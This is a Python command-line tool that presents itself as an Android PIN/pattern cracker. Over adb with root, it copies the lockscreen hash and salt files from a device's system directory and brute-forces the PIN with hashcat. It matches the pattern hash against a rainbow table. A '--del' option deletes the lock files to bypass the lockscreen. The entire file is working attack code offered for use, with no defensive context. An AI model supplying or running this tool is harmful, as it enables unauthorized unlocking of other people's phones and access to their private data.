from dotenv import load_dotenv
from termcolor import colored, cprint
import os, sys, sqlite3, time, json

print_green = lambda x: cprint(x, 'green')
print_red = lambda x: cprint(x, 'red')

print_green("=================================")
print_green("   Android PIN/Pattern Cracker   ")
print_green("         made by @D3vle0         ")
print_green("=================================\n")

load_dotenv(verbose=True)
ADB_PATH = os.getenv('ADB_PATH')
if not ADB_PATH:
    print("[-] Error: ADB_PATH not set")
    sys.exit(1)

def delete():
    os.system("rm locksettings.* &> /dev/null")
    os.system("rm gesture.* &> /dev/null")
    os.system("rm password.key &> /dev/null") 
    os.system("rm out.txt &> /dev/null")

def check_root():
    try: 
        uid = int(os.popen(f"{ADB_PATH} shell id").read().split("uid=")[1].split(" ")[0].split("(")[0])
    except:
        print_red("[-] Error: No device found")
        sys.exit(3)
    if uid:
        print_red("[-] No root access")
        sys.exit(3)


def show_help():
    print("Usage: python3 crack.py [options]")
    print("Options:")
    print("--del: bypass lockscreen\n--pin <pin length>: crack PIN\n--pattern: crack pattern")
    return

delete()

try:
    if sys.argv[1] == "--help" or sys.argv[1] == "-h":
        show_help()
        sys.exit(0)
    elif sys.argv[1] == "--pin":
        try:
            pin_length = int(sys.argv[2])
            if pin_length < 4 or pin_length > 10:
                print_red("[-] Invalid PIN length")
                sys.exit(3)
        except IndexError:
            print_red("[-] Error: PIN length required.")
            sys.exit(3)
        check_root()
        print("[+] connected to device")
        print("[+] collecting encrypted PIN data...\n")
        os.popen(f"{ADB_PATH} shell 'su -c cat /data/system/password.key' > password.key")
        os.popen(f"{ADB_PATH} pull /data/system/locksettings.db .")
        os.popen(f"{ADB_PATH} pull /data/system/locksettings.db-shm .")
        os.popen(f"{ADB_PATH} pull /data/system/locksettings.db-wal .")
        time.sleep(3)
        conn = sqlite3.connect("locksettings.db")
        cur = conn.cursor()
        cur.execute("SELECT value from locksettings where name = 'lockscreen.password_salt'")
        salt = int(cur.fetchone()[0])
        print(f"[*] salt value in db: {salt}")
        time.sleep(1)
        md5_hash=open("password.key", "r").read()[40:].lower()
        print(f"[*] md5 hash: {md5_hash}")
        if salt > 0:
            calc_salt = hex(salt)[2:]
        else:
            calc_salt = hex((1 << 64) + int(salt))[2:]
        print(f"[*] calculated salt: {calc_salt}\n")

        print(f"[*] calculating hash...\n")
        syntax = ""
        for i in range(pin_length):
            syntax += "?d"
        os.system(f"hashcat -m 10 {md5_hash}:{calc_salt} -a 3 '{syntax}' -D 2 &> /dev/null")
        time.sleep((pin_length-3)*2)
        os.system(f"hashcat -m 10 {md5_hash}:{calc_salt} -a 3 '{syntax}' -D 2 --show > out.txt")
        try:
            pin = os.popen("cat out.txt").read().split("\n")[0].split(":")[2]
        except:
            print_red("[-] Error: Crack failed.")
            sys.exit(3)
        print_green(f'[+] cracked PIN: {pin}')
        delete()
    elif sys.argv[1] == "--pattern":
        check_root()
        print("[+] connected to device")
        print("[+] collecting encrypted pattern data...\n")
        os.popen(f"{ADB_PATH} shell 'su -c cat /data/system/gesture.key' > gesture.key")
        time.sleep(1)
        sha1_hash = os.popen("xxd -p gesture.key").read()[:-1]
        print(f"[*] sha-1 encrypted data: {sha1_hash}")
        print("[+] searching in rainbow table...\n")
        conn = sqlite3.connect("GestureRainbowTable.db")
        cur = conn.cursor()
        cur.execute(f"SELECT pattern FROM RainbowTable WHERE hash = '{sha1_hash}'")
        pattern = cur.fetchall()[0][0]
        print_green(f"[+] cracked pattern: {pattern}")
        queue=json.loads(pattern)
        path=[0]*9
        for i in range(len(queue)):
            path[queue[i]]=i+1
        pattern_path = ""
        for i in range(9):
            if (i+1)%3:
                pattern_path += f"[{str(path[i])}] "
            else:
                pattern_path += f"[{str(path[i])}]\n\n"
        pattern_path = pattern_path[:-1]
        print_green(pattern_path)
        delete()
    elif sys.argv[1] == "--del":
        check_root()
        print("[+] connected to device")
        print("[+] bypassing lockscreen...\n")
        os.system(f"{ADB_PATH} shell 'su -c rm /data/system/gesture.key'")
        os.system(f"{ADB_PATH} shell 'su -c rm /data/system/locksettings.db'")
        os.system(f"{ADB_PATH} shell 'su -c rm /data/system/locksettings.db-shm'")
        os.system(f"{ADB_PATH} shell 'su -c rm /data/system/locksettings.db-wal'")
        os.system(f"{ADB_PATH} shell 'su -c rm /data/system/password.key'")
        print_green("[+] done")
    else:
        show_help()
        sys.exit(3)
except IndexError:
    show_help()
    sys.exit(3)